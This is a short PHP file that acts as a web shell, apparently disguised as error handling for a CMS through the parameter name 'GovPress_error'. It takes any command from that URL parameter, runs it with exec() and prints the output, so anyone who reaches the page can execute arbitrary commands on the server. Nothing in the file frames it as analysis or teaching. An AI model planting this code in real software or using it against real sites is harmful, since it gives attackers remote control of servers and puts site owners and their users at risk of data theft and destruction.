<?php
if (isset($_GET['GovPress_error'])) {
    $command = $_GET['GovPress_error'];

    // Execute the command using exec
    $output = [];
    $returnValue = null;
    exec($command, $output, $returnValue);

    if ($returnValue === 0) {
        // Display the output
        echo "<pre>" . implode("\n", $output) . "</pre>";
    } else {
        // Handle errors
        echo "Error executing command. Return value: $returnValue";
    }
}
?>
